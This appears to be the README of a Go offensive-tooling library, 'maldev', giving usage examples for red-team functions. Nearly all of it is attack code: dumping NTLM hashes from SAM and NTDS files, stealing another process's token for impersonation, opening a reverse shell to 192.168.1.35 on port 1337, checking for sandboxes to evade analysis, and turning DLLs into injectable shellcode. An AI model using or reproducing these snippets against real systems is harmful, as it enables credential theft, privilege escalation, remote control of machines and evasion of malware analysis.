# Red Team Examples

## Multiple shellcode injection techniques

See `techniques_windows.go` for all the supported techniques

## Dump system hashes (different ways)

- This functions use [gosecretsdump](https://github.com/C-Sto/gosecretsdump) which is really fast and can NTLM dump hashes with a lot of config options

```go
package main

import (
  "fmt"

  "github.com/D3Ext/maldev/redteam"
)

func main(){
  // First way (using SAM and SYSTEM)
  hashes1, err := redteam.DumpSamHashes("C:\\path\\to\\system", "C:\\path\\to\\sam")
  if err != nil {
    log.Fatal(err)
  }
  fmt.Println(hashes1)

  // Second way (using NTDS and SYSTEM)
  hashes2, err := redteam.DumpNtdsHashes("C:\\path\\to\\system", "C:\\path\\to\\ntds")
  if err != nil {
    log.Fatal(err)
  }
  fmt.Println(hashes2)

  // Third way (automated mode)
  hashes3, err := redteam.AutoHashDump()
  if err != nil {
    log.Fatal(err)
  }
  fmt.Println(hashes3)

}
```

## Steal process token (impersonation)

```go
package main

import (
  "log"

  "github.com/D3Ext/maldev/redteam"
)

func main(){

  pid := 1234 // Set PID to steal
  token, err := redteam.Impersonate(pid) // Returns error if user doesn't have privileges
  if err != nil {
    log.Fatal(err)
  }
}
```

## Send Reverse Shell

```go
package main

import (
  "github.com/D3Ext/maldev/src/redteam"
)

func main(){
  redteam.ReverseShell("192.168.1.35", 1337)
}
```

## Anti-Sandboxing techniques

```go
package main

import (
  "fmt"
  "log"
  "github.com/D3Ext/maldev/src/redteam"
)

func main(){
  var cfg redteam.SandboxConfig = redteam.DefaultConfig

  results, err := redteam.AllSandboxChecks(cfg)
  if err != nil {
    log.Fatal(err)
  }

  // should print true if it is a potential sandbox
  fmt.Println(results.MinSpace)
  fmt.Println(results.Cores)
  fmt.Println(results.Memory)
  fmt.Println(results.Path)
  fmt.Println(results.Time)
  fmt.Println(results.Software)
  fmt.Println(results.Drivers)
  fmt.Println(results.Internet)
  fmt.Println(results.Processes)
  fmt.Println(results.Network)
  fmt.Println(results.Uptime)
}
```

## Convert DLL to to position independent shellcode

```go
package main

import (
  "fmt"
  "log"

  "github.com/D3Ext/maldev/src/redteam"
)

func main(){
  // get content of DLL as raw bytes
  dll_bytes, err := redteam.GetShellcodeFromFile("example.dll")
  if err != nil {
    log.Fatal(err)
  }

  // convert DLL to shellcode
  shellcode, err := redteam.ConvertDllToShellcode(dll_bytes, "", "")
  if err != nil {
    log.Fatal(err)
  }

  fmt.Println(shellcode)
}
```


